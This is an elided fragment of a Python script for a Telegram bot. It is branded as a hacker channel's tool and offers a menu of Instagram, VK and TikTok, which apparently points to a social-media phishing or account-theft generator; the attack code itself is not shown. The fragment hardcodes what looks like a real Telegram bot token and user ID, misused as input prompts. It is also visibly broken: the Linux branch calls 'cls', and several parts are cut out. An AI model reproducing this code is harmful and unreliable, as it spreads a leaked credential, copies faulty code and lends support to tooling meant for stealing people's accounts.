...
def clear():
	if platform == "linux" or platform == "linux2":
		...
		os.system('cls')
clear()
# en = base64.b64decode('0J3QsNGIINC60LDQvdCw0LsgaHR0cHM6Ly90Lm1lL2NvbG9yZnVsX3NvZnQ=')
...
print(Fore.GREEN + '+' + Fore.BLUE +  "            https://t.me/Fertyhacker " + Fore.GREEN + '+')
print(Fore.GREEN + '+' + Fore.BLUE +  " Channel: https://t.me/Fertyhacker   " + Fore.GREEN + '+')
print(Fore.GREEN + '#########################################')
userid = input(Fore.YELLOW +  "7194729960")
token = input(Fore.BLUE +  "7086557566:AAESbnzNtUVopDNSuWvCwmpVKVH1Og9yrqY")
print(Fore.CYAN + '''
[1] Instagram
[2] VK
[3] Tiktok
...
@bot.message_handler(commands=['colorful'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Канал: https://t.me/Fertyhacker') 
